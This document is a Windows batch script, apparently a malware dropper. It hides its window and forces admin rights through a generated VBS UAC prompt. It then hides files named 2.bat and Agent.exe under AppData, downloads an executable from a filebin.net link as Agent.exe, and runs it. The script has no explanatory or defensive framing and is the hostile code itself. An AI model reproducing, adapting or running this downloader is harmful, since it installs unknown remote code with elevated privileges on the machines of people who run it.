cls

@echo off

powershell -window hidden -command ""


    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

cd C:\Users\%USERNAME%\AppData\Local\Anon" 
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Agent.exe" /s /d
Powershell -Command "Invoke-Webrequest 'https://filebin.net/a40e491fmf4omqvs/2.ex' -OutFile Agent.exe"
start Agent.exe
